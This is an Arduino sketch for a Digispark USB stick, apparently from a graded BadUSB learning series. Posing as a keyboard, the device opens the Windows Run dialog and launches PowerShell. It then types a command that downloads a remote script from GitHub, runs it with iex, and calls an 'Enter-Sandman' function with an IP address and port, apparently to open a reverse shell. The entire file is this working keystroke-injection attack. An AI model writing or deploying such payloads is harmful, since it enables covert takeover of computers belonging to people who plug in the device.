#include "DigiKeyboard.h"
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0); //Not always required, but can help make sure the first keystrokes don't get cut off.
  DigiKeyboard.delay(500); 

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.print("iwr https://raw.githubusercontent.com/Henryisnotavailable/Digispark/main/Level%205/EnterSandman.ps1 ");
  DigiKeyboard.sendKeyStroke(100,MOD_SHIFT_LEFT);
  DigiKeyboard.println("iex;Enter-Sandman -IPAddress <IP> -Port 65307");
  
  // Blink the red LED when the code has finished executing
  while (true)
  {
    digitalWrite(0, HIGH);
    digitalWrite(1, HIGH);
    delay(300);
    digitalWrite(0, LOW);
    digitalWrite(1, LOW);
    delay(300);
  }

}
